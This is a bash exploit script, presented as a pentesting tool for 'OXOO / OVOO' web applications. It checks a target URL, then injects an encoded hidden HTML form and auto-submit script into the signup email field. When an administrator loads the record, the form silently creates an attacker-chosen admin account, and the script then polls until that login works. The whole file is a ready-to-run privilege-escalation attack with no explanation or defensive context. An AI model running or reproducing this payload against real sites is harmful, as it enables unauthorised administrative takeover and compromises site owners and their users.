#!/usr/bin/bash
signup="login/ajax_signup"
login="login/ajax_login"
login_loop (){
creds="email=${uname}${random}@hacker.cyberbullet&password=$pass"
echo -e "\e[1;34mWaiting to login.....\e[0m"
status=$(curl -ks -X POST -d "$creds" $target/$login | jq -r ".login_status")
while [[ $status != "success" ]];do
login_loop
done
echo -e "\e[1;32mExploited Successfully,Now you can login.Email = ${uname}${random}@hacker.cyberbullet  Password = $pass\e[0m"
exit
}
html_injection () {
read -p $'\e[1;32mEnter Username :: \e[0m' uname
read -p $'\e[1;32mEnter Password :: \e[0m' pass
random=$(echo $RANDOM | md5sum | head -c 6)
codeHTML="%3Cform%20id%3D%22id%22%20action%3D%22${target}%2Fadmin%2Fmanage_user%2Fadd%2F%22%20method%3D%22POST%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22name%22%20value%3D%22${uname}%22%20%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22email%22%20value%3D%22${uname}${random}%40hacker.cyberbullet%22%20%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22password%22%20value%3D%22${pass}%22%20%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22role%22%20value%3D%22admin%22%20%2F%3E%0A%20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20document.forms%5B%27id%27%5D.submit%28%29%3B%0A%20%20%20%20%20%20%20%20%3C%2Fscript%3E%0A"
json=$(curl -ks -X POST -d "username=Jack${random}&email=$uname${random}@gmail.com${codeHTML}&password=${pass}" $target/$signup | jq -r ".signup_status")
if [[ $json == "success" ]];then
echo -e "\e[1;32mExploited,First step completed\e[0m"
login_loop
else
echo -e "\e[1;31mFail to exploit\e[0m"
fi
}
banner () {
clear
echo -e "\e[1;32m
                _|_|_|      _|_|      _|_|_|  _|    _|  
                _|    _|  _|    _|  _|        _|    _|  
                _|_|_|    _|_|_|_|    _|_|    _|_|_|_|  
                _|    _|  _|    _|        _|  _|    _|  
                _|_|_|    _|    _|  _|_|_|    _|    _|  
         \e[1;33m   ********************************************
            *                                          *
            *        BASH Scripts For Pentesting       *
            *        Coded By :: CyberBullet           *
            *            OXOO / OVOO Exploit           *
            *                                          *
            ********************************************
\e[0m"
}
check_vuln (){
read -p $'\e[1;32mEnter Target :: \e[0m' target
status=$(curl -ks $target/$signup)
if [[ $status != "page not found" && $status != "" ]];then
echo -e "\e[1;32mTarget is Vulnerable\e[0m"
html_injection
else
echo -e "\e[1;31mTarget is not vulnerable\e[0m"
exit
fi
}
main () {
banner
check_vuln
}
main
